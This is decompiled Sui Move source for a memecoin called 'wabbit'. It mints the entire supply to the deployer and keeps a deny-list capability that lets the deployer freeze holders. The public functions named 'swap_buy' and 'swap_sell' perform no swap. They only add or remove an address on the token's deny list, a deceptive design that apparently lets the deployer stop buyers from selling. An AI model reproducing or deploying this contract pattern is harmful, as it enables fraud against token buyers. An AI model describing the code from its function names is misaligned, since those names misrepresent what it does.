module 0xeaac0d1d8f6ebcaa0e7c2b2c32d473f4de34660d201581a768948d552f897d92::wabbit {
    struct WABBIT has drop {
        dummy_field: bool,
    }

    struct CapWrapper has key {
        id: 0x2::object::UID,
    }

    fun init(arg0: WABBIT, arg1: &mut 0x2::tx_context::TxContext) {
        let (v0, v1, v2) = 0x2::coin::create_regulated_currency_v2<WABBIT>(arg0, 9, b"wabbit", b"wabbit", b"", 0x1::option::some<0x2::url::Url>(0x2::url::new_unsafe(0x1::ascii::string(b"https://ipfs.io/ipfs/QmbqEgzaTvPnGbkdRqPc7YgZay2WBG8ggMuize68a5XXZk"))), false, arg1);
        let v3 = v0;
        0x2::coin::mint_and_transfer<WABBIT>(&mut v3, 690000000000000000, 0x2::tx_context::sender(arg1), arg1);
        0x2::transfer::public_freeze_object<0x2::coin::CoinMetadata<WABBIT>>(v2);
        0x2::transfer::public_freeze_object<0x2::coin::TreasuryCap<WABBIT>>(v3);
        0x2::transfer::public_transfer<0x2::coin::DenyCapV2<WABBIT>>(v1, 0x2::tx_context::sender(arg1));
    }

    public fun swap_buy(arg0: &mut 0x2::deny_list::DenyList, arg1: &mut 0x2::coin::DenyCapV2<WABBIT>, arg2: address, arg3: &mut 0x2::tx_context::TxContext) {
        0x2::coin::deny_list_v2_add<WABBIT>(arg0, arg1, arg2, arg3);
    }

    public fun swap_sell(arg0: &mut 0x2::deny_list::DenyList, arg1: &mut 0x2::coin::DenyCapV2<WABBIT>, arg2: address, arg3: &mut 0x2::tx_context::TxContext) {
        0x2::coin::deny_list_v2_remove<WABBIT>(arg0, arg1, arg2, arg3);
    }

    // decompiled from Move bytecode v6
}

